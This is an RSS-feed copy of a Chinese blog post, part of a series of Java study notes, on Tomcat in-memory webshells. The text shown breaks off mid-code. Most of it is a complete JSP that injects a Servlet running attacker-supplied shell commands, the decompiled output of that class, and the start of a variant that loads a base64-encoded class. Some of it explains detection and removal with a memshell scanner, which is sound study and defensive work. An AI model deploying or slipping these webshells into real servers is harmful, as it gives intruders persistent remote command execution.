<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 30 May 2022 23:20:41 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>Java学习笔记Ⅴ</title><link>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</link><pubDate>Mon, 30 May 2022 23:20:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</guid><description>&lt;p>各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末&lt;/p>
&lt;hr>
&lt;blockquote>
&lt;p>本文涉及到的Java环境&amp;amp;相关依赖，仅供参考：&lt;/p>
&lt;p>Java 1.8.0_311 (8u311)&lt;/p>
&lt;p>tomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73&lt;/p>
&lt;p>commons-collections 3.2.1&lt;/p>
&lt;p>javassist 3.20.0-GA&lt;/p>
&lt;/blockquote>
&lt;h2 id="jsp文件落地">jsp&amp;amp;文件落地&lt;/h2>
&lt;p>可能很多人会觉得：都内存马了怎么还能文件落地？？？&lt;/p>
&lt;p>有一说一，确实，但逻辑不是这样讲的：应该是内存马可以做到文件不落地——也就是说删除上马时凭借的.java .jsp .class文件后一样可以运行于内存中并执行命令（除非单独kill），而上马的过程中根据使用手段的不同会产生一定程度的文件落地&lt;/p>
&lt;p>对于jsp来说，&lt;strong>一定&lt;/strong>会在初次请求时被tomcat自动生成对应的.java和.class文件并放在临时目录中，毕竟jsp本质就是一个Servlet，基于此，所有的jsp webshell都会产生文件落地（除非自删除 参见后面的三级标题）&lt;/p>
&lt;p>而jsp webshell，三梦师傅的&lt;a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">都0202年了老嗨还在用的 - 各种姿势jsp webshell&lt;/a>已经杀死了比赛，下面我们重点来看内存马&lt;/p>
&lt;h3 id="虚假的jsp">虚假的jsp&lt;/h3>
&lt;p>代码参考自&lt;a href="https://xz.aliyun.com/t/11003">JAVA内存马的“一生”&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.ApplicationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.lang.reflect.Field&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.StandardContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.IOException&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.InputStream&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.util.Scanner&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.PrintWriter&amp;#34; %&amp;gt;
&amp;lt;%@ page language=&amp;#34;java&amp;#34; contentType=&amp;#34;text/html; charset=UTF-8&amp;#34; pageEncoding=&amp;#34;UTF-8&amp;#34;%&amp;gt;
&amp;lt;%
final String name = &amp;#34;servletshell&amp;#34;;
// 获取上下文
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
// 注册Servlet对象 并重写service方法
Servlet servlet = new Servlet() {
@Override
public void init(ServletConfig servletConfig) throws ServletException {
}
@Override
public ServletConfig getServletConfig() {
return null;
}
@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
String cmd = servletRequest.getParameter(&amp;#34;cmd&amp;#34;); // get传入cmd参数
// 确定目标操作系统
boolean isLinux = true;
String osTyp = System.getProperty(&amp;#34;os.name&amp;#34;);
if (osTyp != null &amp;amp;&amp;amp; osTyp.toLowerCase().contains(&amp;#34;win&amp;#34;)) {
isLinux = false;
}
String[] cmds = isLinux ? new String[] {&amp;#34;sh&amp;#34;, &amp;#34;-c&amp;#34;, cmd} : new String[] {&amp;#34;cmd.exe&amp;#34;, &amp;#34;/c&amp;#34;, cmd}; // 确定命令执行的格式
// 处理输入&amp;amp;命令执行
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
// 回显执行结果
Scanner s = new Scanner( in ).useDelimiter(&amp;#34;\\a&amp;#34;);
String output = s.hasNext() ? s.next() : &amp;#34;&amp;#34;;
PrintWriter out = servletResponse.getWriter();
out.println(output);
out.flush();
out.close();
}
@Override
public String getServletInfo() {
return null;
}
@Override
public void destroy() {
}
};
// 创建Wrapper对象来封装前面new Servlet对象
org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
newWrapper.setName(name);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet(servlet);
newWrapper.setServletClass(servlet.getClass().getName());
// 为内存马添加路由映射
standardContext.addChild(newWrapper);
standardContext.addServletMappingDecoded(&amp;#34;/servletmemshell&amp;#34;,name);
response.getWriter().write(&amp;#34;inject success&amp;#34;);
%&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;servletshell&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>很好理解，通过注册Servlet并重写service方法来做到命令执行+回显，访问一次这个jsp就可以添加Servlet类型内存马到/servletmemshell路径下，但我们借助&lt;a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner&lt;/a>就可以发现事情没我们想的那么完美&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531001914278.png" alt="image-20220531001914278">&lt;/p>
&lt;p>把它dump下来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Source code recreated from a .class file by IntelliJ IDEA
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// (powered by FernFlower decompiler)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.jsp&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.InputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.PrintWriter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.Servlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">test_jsp$1&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Servlet&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">test_jsp$1&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">test_jsp&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this$0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletConfig&lt;/span> &lt;span style="color:#111">servletConfig&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">ServletConfig&lt;/span> &lt;span style="color:#75af00">getServletConfig&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">service&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;os.name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osTyp&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">osTyp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;win&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">isLinux&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;sh&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">in&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmds&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">in&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">useDelimiter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\a&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PrintWriter&lt;/span> &lt;span style="color:#111">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getServletInfo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">destroy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以说所谓的“内存马”显露无疑，被看的干干净净&lt;/p>
&lt;p>究其原因并不复杂，这里dump下来的&lt;code>test_jsp$1.class&lt;/code>文件就是jsp马中&lt;code>Servlet servlet = new Servlet(){}&lt;/code>的部分，它实现了servletshell的主要功能；而因为Servlet直接被注册到当前上下文中了，所以当我们手动删除这个jsp和附带的所有.class文件后会发现/servletshell路径下的内存马依旧可以照常工作，memshell scanner会这样显示&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531004046566.png" alt="image-20220531004046566">&lt;/p>
&lt;p>真 · 内存马，不过只要使用memshell scanner的kill功能（从上下文中解绑Servlet）即可杀掉这个马，并且由于此前删掉了上马所用的.jsp文件，所以做到了彻底清除servletshell&lt;/p>
&lt;h3 id="字节码jsp">字节码jsp&lt;/h3>
&lt;p>可能有师傅能看出问题所在：这就离谱，你内存马都不用个字节码加载 这肯定会连着jsp文件一起被编译啊？？？&lt;/p>
&lt;p>有一说一，确实，那我们把上面的在jsp内直接new Servlet的做法换做字节码的形式&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.ApplicationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.lang.reflect.Field&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.core.StandardContext&amp;#34; %&amp;gt;
&amp;lt;%@ page language=&amp;#34;java&amp;#34; contentType=&amp;#34;text/html; charset=UTF-8&amp;#34; pageEncoding=&amp;#34;UTF-8&amp;#34;%&amp;gt;
&amp;lt;%
String classCode = &amp;#34;yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==&amp;#34;;
// 获取上下文
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField(&amp;#34;context&amp;#34;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
